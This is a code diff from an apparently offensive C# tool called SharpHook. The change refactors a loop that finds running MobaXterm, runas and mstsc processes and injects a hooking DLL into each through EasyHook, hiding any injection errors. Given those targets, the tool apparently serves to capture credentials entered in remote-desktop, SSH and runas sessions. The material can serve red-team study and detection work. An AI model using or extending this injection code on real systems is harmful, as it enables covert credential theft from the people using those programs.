@@ -42,39 +42,52 @@ namespace SharpHook
                 //Reset list of PIDs and get processes
                 PIDs.Clear();
                 processes = Process.GetProcesses().ToList();
+
+                var SupportedProcesses = new List<string>()
+                {
+                    "MobaXterm",
+                    "runas",
+                    "mstsc"
+                };
+
+                
+
                 for (int i = 0; i < processes.Count; i++)
                 {
                     PIDs.Add(processes[i].Id);
 
-                    //only inject if the process is mstsc and if we haven't already injected
-                    if (processes[i].ProcessName == "MobaXterm" && injectedProcesses.IndexOf(processes[i].Id) == -1 ||  processes[i].ProcessName == "runas" && injectedProcesses.IndexOf(processes[i].Id) == -1 || processes[i].ProcessName == "mstsc" && injectedProcesses.IndexOf(processes[i].Id) == -1)
+                    SupportedProcesses.ForEach(delegate (String Pname)
                     {
-                        try
+                        if (processes[i].ProcessName == Pname && injectedProcesses.IndexOf(processes[i].Id) == -1)
                         {
-                            
-                            targetPID = processes[i].Id;
+                            try
+                            {
 
-                            
-                            Console.WriteLine("[*] Attempting to inject into {0}", processes[i].ProcessName);
+                                targetPID = processes[i].Id;
 
-                            // inject into existing process
-                            EasyHook.RemoteHooking.Inject(
-                                targetPID,          // ID of process to inject into
-                                injectionLibrary,   // 32-bit library to inject (if target is 32-bit)
-                                injectionLibrary,   // 64-bit library to inject (if target is 64-bit)
-                                channelName         // the parameters to pass into injected library
-                                );
-                            injectedProcesses.Add(processes[i].Id);
 
+                                Console.WriteLine("[*] Attempting to inject into {0}", processes[i].ProcessName);
+
+                                // inject into existing process
+                                EasyHook.RemoteHooking.Inject(
+                                    targetPID,          // ID of process to inject into
+                                    injectionLibrary,   // 32-bit library to inject (if target is 32-bit)
+                                    injectionLibrary,   // 64-bit library to inject (if target is 64-bit)
+                                    channelName         // the parameters to pass into injected library
+                                    );
+                                injectedProcesses.Add(processes[i].Id);
+
+                            }
+                            catch (Exception e)
+                            {
+                                //Console.ForegroundColor = ConsoleColor.Red;
+                                //Console.WriteLine("[-] There was an error while injecting into target:");
+                                //Console.ResetColor();
+                                //Console.WriteLine(e.ToString());
+                            }
                         }
-                        catch (Exception e)
-                        {
-                            //Console.ForegroundColor = ConsoleColor.Red;
-                            //Console.WriteLine("[-] There was an error while injecting into target:");
-                            //Console.ResetColor();
-                            //Console.WriteLine(e.ToString());
-                        }
-                    }
+                    });
+                   
                 }
                 //check if any of our injected processes have exited
                 for(int i = 0; i < injectedProcesses.Count; i++)
